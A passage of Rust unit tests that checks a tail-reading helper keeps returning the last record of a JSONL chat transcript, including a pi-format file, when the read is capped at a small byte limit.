        let (whole, _, whole_trunc) =
            read_tail_including_last_record(&path, size + 1).unwrap();
        assert!(!whole_trunc);
        assert_eq!(whole.len() as u64, size);

        std::fs::remove_dir_all(path.parent().unwrap()).ok();
    }

    #[test]
    fn the_pi_path_shares_the_walk_back() {
        // The pi read path calls the same helper, so a small cap on a pi transcript
        // returns the last record rather than an empty list. Exercised at the helper
        // level against a pi-shaped `.jsonl` (a header line + record lines), which is
        // what `pi::parse` consumes; the guarantee is the same: non-empty ⇒ non-empty.
        let path = scratch_transcript("pi");
        let big = "z".repeat(10_000);
        // pi's own record shape (v3): `{"type":"message","message":{…}}`. A header
        // line first, then two message records, the last one far larger than the cap.
        let last = format!(
            r#"{{"type":"message","message":{{"role":"user","content":"{big}"}}}}"#
        );
        let body = format!(
            "{}\n{}\n{last}\n",
            r#"{"type":"session","id":"pi-conv","cwd":"/tmp"}"#,
            r#"{"type":"message","message":{"role":"user","content":"hi"}}"#,
        );
        std::fs::write(&path, &body).unwrap();
        let size = std::fs::metadata(&path).unwrap().len();

        let (bytes, reported, truncated) =
            read_tail_including_last_record(&path, 1024).unwrap();
        assert_eq!(reported, size);
        assert!(truncated);
        let parsed = pi::parse(&bytes, truncated);
        assert!(
            !parsed.entries.is_empty(),
            "pi walk-back returned zero records from a non-empty file",
        );

        std::fs::remove_dir_all(path.parent().unwrap()).ok();
    }
}
